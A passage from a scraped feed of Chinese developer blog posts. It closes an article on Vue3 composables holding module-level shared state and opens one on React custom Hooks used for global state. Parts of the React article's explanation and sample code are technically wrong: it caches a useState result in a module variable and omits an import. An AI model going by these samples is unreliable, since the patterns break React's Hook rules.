    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-else</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"isLogin"</span>&gt;</span>欢迎 {{ user.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-else</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleLogin"</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { useGlobalAuth } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalAuth'</span>;
<span class="hljs-keyword">const</span> { user, isLogin, loading, error, login } = <span class="hljs-title function_">useGlobalAuth</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">login</span>(<span class="hljs-string">'admin'</span>, <span class="hljs-string">'123456'</span>);
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h4 data-id="heading-16">进阶特性：</h4>
<ul>
<li>异步状态管理：内置 <code>loading</code>/<code>error</code> 状态，适配接口请求场景；</li>
<li>依赖注入：避免深层组件重复导入组合式函数，简化代码结构；</li>
<li>模块级缓存：异步请求仅执行一次（模块初始化时），所有组件共享请求结果。</li>
</ul>
<h2 data-id="heading-17">四、关键疑问解答：每次引入组合式函数，状态会重新初始化吗？</h2>
<p>结合示例和原理，我们详细解答这个核心问题：</p>
<h3 data-id="heading-18">1. 结论：不会重新初始化，仅函数逻辑重复执行</h3>
<ul>
<li><strong>响应式状态的初始化：仅执行一次</strong>：模块内的 <code>user = ref(null)</code>、<code>globalStateMap = new Map()</code> 等变量存储在<strong>模块作用域</strong>中，模块首次导入时会执行一次初始化，创建响应式对象实例；后续所有组件导入该模块并调用组合式函数时，不会重新创建这些变量，因此响应式状态的初始化仅执行一次。</li>
<li><strong>组合式函数的执行：每次组件调用都会执行</strong>：组件每次渲染（或初始化）时，调用组合式函数（如 <code>useGlobalUser()</code>）会重复执行函数内部的逻辑，但函数返回的是模块缓存的同一个响应式对象（<code>ref</code>/<code>reactive</code> 实例）—— 因此状态引用不变，不会触发不必要的更新。</li>
</ul>
<h3 data-id="heading-19">2. 代码验证：打印日志看执行次数</h3>
<p>修改 <code>useGlobalUser.js</code>，添加日志验证：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser.js</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'模块初始化：仅执行一次'</span>); <span class="hljs-comment">// 模块首次导入时打印</span>

<span class="hljs-comment">// 模块级响应式状态（仅初始化一次）</span>
<span class="hljs-keyword">const</span> user = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'响应式状态初始化：仅执行一次'</span>); <span class="hljs-comment">// 模块首次导入时打印</span>

<span class="hljs-keyword">const</span> isLogin = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!user.<span class="hljs-property">value</span>);

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'组合式函数执行：组件调用时执行'</span>); <span class="hljs-comment">// 组件每次调用都会打印</span>
  <span class="hljs-keyword">return</span> { user, isLogin };
}
</code></pre>
<h4 data-id="heading-20">日志输出结果：</h4>
<ol>
<li>应用启动时（模块首次导入）：打印 <code>模块初始化：仅执行一次</code> → <code>响应式状态初始化：仅执行一次</code>；</li>
<li>第一个组件（如 Header）调用时：打印 <code>组合式函数执行：组件调用时执行</code>；</li>
<li>第二个组件（如 Login）调用时：打印 <code>组合式函数执行：组件调用时执行</code>（无 “响应式状态初始化” 日志）；</li>
<li>组件重渲染时（如登录后）：两个组件都会打印 <code>组合式函数执行：组件调用时执行</code>（仍无 “响应式状态初始化” 日志）。</li>
</ol>
<h4 data-id="heading-21">结论验证：</h4>
<ul>
<li>模块初始化和响应式状态创建仅执行一次（状态不会重新初始化）；</li>
<li>组合式函数本身会在组件每次调用时执行，但仅返回缓存的响应式对象，无额外性能开销。</li>
</ul>
<h3 data-id="heading-22">3. 与 Vue3 局部组合式函数的区别</h3>






























<table><thead><tr><th>特性</th><th>局部组合式函数（如 useLocalCounter）</th><th>全局组合式函数（如 useGlobalUser）</th></tr></thead><tbody><tr><td>状态存储位置</td><td>组件实例的 setup 作用域中</td><td>模块作用域的闭包中</td></tr><tr><td>状态共享性</td><td>组件私有（每个组件调用创建独立状态）</td><td>跨组件共享（所有组件调用共享同一状态）</td></tr><tr><td>响应式状态初始化次数</td><td>每个组件调用一次</td><td>模块初始化时仅一次</td></tr><tr><td>函数执行次数</td><td>组件每次渲染执行</td><td>组件每次调用执行（仅返回缓存）</td></tr></tbody></table>
<h2 data-id="heading-23">五、Vue3 组合式函数 vs React 自定义 Hook：全局状态实现差异</h2>



































<table><thead><tr><th>对比维度</th><th>Vue3 组合式函数</th><th>React 自定义 Hook</th></tr></thead><tbody><tr><td>响应式基础</td><td>基于 Proxy 的独立响应式系统（不依赖组件）</td><td>基于组件 Hook 链表（依赖组件实例）</td></tr><tr><td>订阅机制</td><td>自动依赖追踪（无需手动维护订阅者）</td><td>需手动维护订阅者或 forceUpdate</td></tr><tr><td>代码简洁度</td><td>极简（直接返回响应式对象）</td><td>需额外处理订阅和更新触发</td></tr><tr><td>状态类型支持</td><td>自动适配 ref（基本类型）/reactive（对象）</td><td>统一用 useState（需手动浅拷贝对象）</td></tr><tr><td>SSR 兼容性</td><td>需额外处理（模块状态会共享给所有请求）</td><td>同样需额外处理（状态污染问题）</td></tr></tbody></table>
<p>核心差异：Vue3 的响应式系统 “脱离” 组件实例，使得模块级全局状态的实现更自然、代码更简洁；而 React 需通过闭包 “脱离” 组件 Hook 链表，且需手动处理组件重渲染触发。</p>
<h2 data-id="heading-24">六、适用场景与局限性</h2>
<h3 data-id="heading-25">1. 适用场景</h3>
<ul>
<li>中小型应用或大型应用的非核心状态（如用户信息、主题、权限、全局通知、加载状态）；</li>
<li>不需要复杂中间件、状态回溯、时间旅行等高级特性；</li>
<li>追求轻量化、无额外依赖（无需引入 Pinia/Vuex）；</li>
<li>跨组件共享简单响应式状态，或需要复用异步逻辑（如接口请求 + 状态管理）。</li>
</ul>
<h3 data-id="heading-26">2. 局限性</h3>
<ul>
<li><strong>SSR 状态污染风险</strong>：模块级状态在 SSR 中会被所有请求共享（因为 SSR 是多请求复用一个模块实例），导致不同用户看到他人的状态 —— 需通过 <code>serverPrefetch</code> 或状态隔离机制解决；</li>
<li><strong>缺乏状态调试工具</strong>：没有 Pinia DevTools 那样的可视化调试工具，难以追踪状态变更历史；</li>
<li><strong>复杂状态逻辑维护成本高</strong>：若需状态依赖、批量更新、异步流控制（如请求取消），需手动实现，不如 Pinia/Vuex 的内置能力完善；</li>
<li><strong>状态持久化需手动处理</strong>：刷新页面后状态会丢失，需手动结合 <code>localStorage</code>/<code>sessionStorage</code> 实现持久化；</li>
<li><strong>多团队协作冲突风险</strong>：无统一的状态命名规范时，可能出现 <code>key</code> 冲突（如多个团队同时使用 <code>user</code> 作为状态 key）。</li>
</ul>
<h2 data-id="heading-27">七、总结</h2>
<p>Vue3 组合式函数之所以能轻松实现模块级全局状态，核心是<strong>模块作用域的闭包缓存 + 响应式系统的独立性</strong>：模块初始化时创建的响应式对象（<code>ref</code>/<code>reactive</code>）被缓存，所有组件调用组合式函数时共享同一个实例，且响应式系统自动追踪依赖，状态更新时关联组件自动重渲染。</p>
<p>每次引入组合式函数后，响应式状态不会重新初始化（仅模块首次导入时执行一次），函数逻辑的重复执行仅为返回缓存实例，无性能开销。</p>
<p>这种方案的优势是<strong>轻量化、易实现、代码简洁</strong>，适合简单全局状态场景；若项目需复杂状态管理（如多模块状态、调试、SSR 兼容），则推荐使用 Vue 官方推荐的 Pinia（本质是基于组合式函数 + 模块作用域实现的成熟方案）。</p>
<p>理解组合式函数的全局状态原理，不仅能帮助我们灵活应对不同场景，更能深入掌握 Vue3 的模块机制、响应式系统和组合式 API 设计理念，提升 Vue3 开发的底层认知。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React 自定义 Hook：能否作为模块级全局状态管理？]]></title>    <link>https://juejin.cn/post/7575887863796924426</link>    <guid>https://juejin.cn/post/7575887863796924426</guid>    <pubDate>2025-11-24T06:43:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575887863796924426" data-draft-id="7575887863796793354" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React 自定义 Hook：能否作为模块级全局状态管理？"/> <meta itemprop="keywords" content="前端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T06:43:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="三小河"/> <meta itemprop="url" content="https://juejin.cn/user/4222562141210478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React 自定义 Hook：能否作为模块级全局状态管理？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222562141210478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    三小河
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T06:43:15.000Z" title="Mon Nov 24 2025 06:43:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 React 开发中，状态管理是核心需求之一。从简单的组件内 state，到 Context API、Redux 等全局状态方案，开发者一直在根据场景选择合适的方案。而自定义 Hook 作为 React 的核心特性，因其复用逻辑的能力，常常被开发者尝试用于全局状态管理。但随之而来的疑问是：自定义 Hook 真的能实现模块级全局状态吗？为什么能这么做？每次引入后内部的 state 会重新初始化吗？本文将从原理、示例、细节三个维度，彻底解答这些问题。</p>
<h2 data-id="heading-0">一、先明确结论</h2>
<ol>
<li><strong>自定义 Hook 可以实现模块级全局状态管理</strong>，但有适用场景（小型应用、非复杂状态）；</li>
<li>其核心原理是<strong>模块级作用域的闭包缓存</strong>—— 状态被存储在模块的闭包中，而非组件实例，因此跨组件复用 Hook 时能共享同一状态；</li>
<li>每次组件引入并调用该 Hook 时，<strong>内部的 state 不会重新执行初始化</strong>，而是复用模块闭包中缓存的状态（仅组件渲染时重新执行 Hook 的逻辑，但 state 引用不变）。</li>
</ol>
<h2 data-id="heading-1">二、为什么自定义 Hook 能实现全局状态？核心原理拆解</h2>
<p>要理解这个问题，需要先理清两个关键概念：<strong>模块作用域</strong>和<strong>React Hook 的执行机制</strong>。</p>
<h3 data-id="heading-2">1. 模块作用域：状态的 “全局容器”</h3>
<p>在 ES6 模块系统中，每个<code>.js</code>文件都是一个独立的模块，模块内的变量、函数会形成<strong>模块级作用域</strong>—— 即模块被导入时，会先执行一次初始化，之后所有导入该模块的地方，共享的是同一个模块实例，模块内的变量不会被重复创建。</p>
<h3 data-id="heading-3">2. React Hook 的 “状态绑定”：依赖闭包而非组件实例</h3>
<p>React 的<code>useState</code>、<code>useEffect</code>等 Hook，其状态是<strong>与组件渲染实例绑定</strong>的吗？表面看是，但如果将 Hook 的逻辑抽离到模块中，结合模块作用域，情况会发生变化：</p>
<p>当我们在模块中定义一个自定义 Hook，并在 Hook 内部调用<code>useState</code>时，这个<code>useState</code>的状态<strong>并不会绑定到某个具体组件</strong>，而是绑定到 “模块级闭包” 中。因为：</p>
<ul>
<li>模块初始化时，自定义 Hook 的函数定义被创建，其内部的<code>useState</code>调用会形成一个闭包；</li>
<li>无论哪个组件导入并调用这个 Hook，本质上都是执行同一个模块中的 Hook 函数，共享同一个闭包环境；</li>
<li>因此，所有组件通过该 Hook 访问的<code>state</code>和<code>setState</code>，都是同一个闭包中的状态和更新函数 —— 这就实现了 “全局共享”。</li>
</ul>
<h3 data-id="heading-4">3. 关键区别：普通自定义 Hook vs 全局状态自定义 Hook</h3>
<p>普通自定义 Hook（如<code>useCounter</code>）通常是 “组件私有” 的，因为它们的<code>useState</code>是在组件调用 Hook 时初始化的，每个组件调用一次 Hook，就会创建一个独立的状态。</p>
<p>而<strong>全局状态自定义 Hook</strong>的核心差异是：将<code>useState</code>的初始化逻辑，通过模块作用域 “提升” 到了模块层面，使得所有组件调用 Hook 时，复用同一个<code>useState</code>的结果。</p>
<h2 data-id="heading-5">三、实战示例：用自定义 Hook 实现模块级全局状态</h2>
<p>下面通过 3 个递进示例，从基础实现到进阶用法，展示自定义 Hook 的全局状态能力，并验证 “状态不重复初始化” 的特性。</p>
<h3 data-id="heading-6">示例 1：基础版全局状态 Hook（共享用户信息）</h3>
<p>需求：实现一个全局用户状态，支持登录、登出，在多个组件中共享用户信息。</p>
<h4 data-id="heading-7">步骤 1：定义全局状态 Hook（模块级）</h4>
<p>创建<code>useGlobalUser.js</code>文件，作为全局状态模块</p>
<pre><code class="hljs language-ini" lang="ini">// useGlobalUser.js（模块级全局状态Hook）
import { useState, useCallback } from 'react'<span class="hljs-comment">;</span>

// 模块作用域的变量：存储用户状态（闭包缓存）
let <span class="hljs-attr">globalUserState</span> = null<span class="hljs-comment">;</span>
// 存储所有订阅组件的更新函数（用于状态变更时通知组件重渲染）
let <span class="hljs-attr">subscribers</span> = new Set()<span class="hljs-comment">;</span>

// 触发所有订阅组件重渲染
const <span class="hljs-attr">notifySubscribers</span> = () =&gt; {
  subscribers.forEach(<span class="hljs-attr">update</span> =&gt; update())<span class="hljs-comment">;</span>
}<span class="hljs-comment">;</span>

// 自定义Hook：供组件调用
export function useGlobalUser() {
  // 每个组件调用Hook时，创建一个本地的更新函数（触发组件重渲染）
  const <span class="hljs-section">[, forceUpdate]</span> = useState({})<span class="hljs-comment">;</span>

  // 组件挂载时订阅，卸载时取消订阅
  useEffect(() =&gt; {
    subscribers.add(forceUpdate)<span class="hljs-comment">;</span>
    return () =&gt; {
      subscribers.delete(forceUpdate)<span class="hljs-comment">;</span>
    }<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[forceUpdate]</span>)<span class="hljs-comment">;</span>

  // 登录：更新全局状态并通知所有订阅组件
  const <span class="hljs-attr">login</span> = useCallback((userInfo) =&gt; {
    <span class="hljs-attr">globalUserState</span> = { ...userInfo }<span class="hljs-comment">;</span>
    notifySubscribers()<span class="hljs-comment">; // 触发所有组件重渲染</span>
  }, <span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>

  // 登出：重置全局状态
  const <span class="hljs-attr">logout</span> = useCallback(() =&gt; {
    <span class="hljs-attr">globalUserState</span> = null<span class="hljs-comment">;</span>
    notifySubscribers()<span class="hljs-comment">;</span>
  }, <span class="hljs-section">[]</span>)<span class="hljs-comment">;</span>

  // 返回全局状态和操作方法
  return {
    user: globalUserState,
    login,
    logout,
    isLogin: !!globalUserState
  }<span class="hljs-comment">;</span>
}
</code></pre>
<h4 data-id="heading-8">步骤 2：在多个组件中使用该 Hook</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Header组件</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Header</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { user, isLogin, logout } = <span class="hljs-title function_">useGlobalUser</span>();
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Header组件渲染：'</span>, user); <span class="hljs-comment">// 验证是否共享状态</span>

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>网站头部<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
      {isLogin ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
          欢迎 {user.name} <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{logout}</span>&gt;</span>登出<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      ) : (
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>未登录<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      )}
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// Login组件</span>
<span class="hljs-keyword">import</span> { useGlobalUser } <span class="hljs-keyword">from</span> <span class="hljs-string">'./useGlobalUser'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Login</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> { login } = <span class="hljs-title function_">useGlobalUser</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// 模拟登录接口返回的用户信息</span>
    <span class="hljs-title function_">login</span>({ <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">avatar</span>: <span class="hljs-string">'xxx.png'</span> });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleLogin}</span>&gt;</span>模拟登录<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}

<span class="hljs-comment">// 主页组件</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Header</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./Header'</span>;
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Login</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'./Login'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">Home</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Login</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
}
</code></pre>
<h4 data-id="heading-9">效果验证：</h4>
<ol>
<li>初始状态：Header 显示 “未登录”，控制台打印<code>Header组件渲染：null</code>；</li>
<li>点击 “模拟登录”：Login 组件调用<code>login</code>更新全局状态，<code>notifySubscribers</code>触发 Header 组件重渲染；</li>
<li>最终效果：Header 显示 “欢迎张三”，控制台打印<code>Header组件渲染：{id:1, name:"张三", ...}</code>；</li>
<li>核心结论：Header 和 Login 组件通过<code>useGlobalUser</code>共享了同一个<code>user</code>状态，状态变更时所有使用该 Hook 的组件都会同步更新。</li>
</ol>
<h3 data-id="heading-10">示例 2：优化版：用 useState 替代模块变量（更符合 React 规范）</h3>
<p>示例 1 中直接用模块变量<code>globalUserState</code>存储状态，虽然可行，但不够 “React 化”。我们可以用<code>useState</code>替代模块变量，利用 React 的状态管理机制自动处理更新：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useGlobalUser优化版.js</span>
<span class="hljs-keyword">import</span> { useState, useCallback, useEffect } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 模块作用域：存储全局状态的Hook实例（闭包缓存）</span>
<span class="hljs-keyword">let</span> globalHook = <span class="hljs-literal">null</span>;

<span class="hljs-comment">// 全局状态的核心Hook（仅初始化一次）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">createGlobalUserHook</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [user, setUser] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">null</span>);

  <span class="hljs-keyword">const</span> login = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">(<span class="hljs-params">userInfo</span>) =&gt;</span> {
    <span class="hljs-title function_">setUser</span>({ ...userInfo });
  }, []);

  <span class="hljs-keyword">const</span> logout = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-title function_">setUser</span>(<span class="hljs-literal">null</span>);
  }, []);

  <span class="hljs-keyword">return</span> {
    user,
    login,
    logout,
    <span class="hljs-attr">isLogin</span>: !!user,
    <span class="hljs-comment">// 暴露setUser供订阅逻辑使用（或直接用user作为依赖）</span>
    <span class="hljs-attr">subscribe</span>: <span class="hljs-function">(<span class="hljs-params">callback</span>) =&gt;</span> {
      <span class="hljs-comment">// 这里利用React的状态更新机制，无需手动维护订阅者</span>
      <span class="hljs-comment">// 组件通过useEffect依赖user，自动触发重渲染</span>
    }
  };
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useGlobalUser</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// 模块初始化时，创建全局Hook实例（仅执行一次）</span>
  <span class="hljs-keyword">if</span> (!globalHook) {
    globalHook = <span class="hljs-title function_">createGlobalUserHook</span>();
  }

  <span class="hljs-comment">// 返回全局状态和方法（所有组件共享同一个实例）</span>
  <span class="hljs-keyword">return</span> globalHook;
}
</code></pre>
<h4 data-id="heading-11">优化点说明：</h4>
<ul>
<li>用<code>useState</code>替代模块变量，利用 React 的状态管理机制，无需手动维护订阅者（组件通过依赖<code>user</code>自动重渲染）；</li>
<li><code>globalHook</code>在模块作用域中仅初始化一次，所有组件调用<code>useGlobalUser</code>时返回的是同一个实例，因此状态完全共享。</li>
</ul>
<h3 data-id="heading-12">示例 3：进阶版：支持多状态、批量更新（类似简易 Context）</h3>
<p>如果需要管理多个全局状态（如用户、主题、权限），可以扩展为 “多状态全局 Hook”：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// useGlobalState.js（通用全局状态Hook）</span>
import { useState, useCallback, useEffect } from 'react';

<span class="hljs-comment">// 模块作用域：存储所有全局状态（key-value形式）</span>
const globalStates = new <span class="hljs-built_in">Map</span>();
<span class="hljs-comment">// 存储每个状态的订阅者</span>
const subscribers = new <span class="hljs-built_in">Map</span>();

<span class="hljs-comment">// 创建或获取全局状态</span>
function <span class="hljs-built_in">getOrCreateGlobalState</span>(key, initialValue) {
  <span class="hljs-comment">// 如果状态已存在，直接返回</span>
  if (globalStates.has(key)) {
    return globalStates<span class="hljs-selector-class">.get</span>(key);
  }

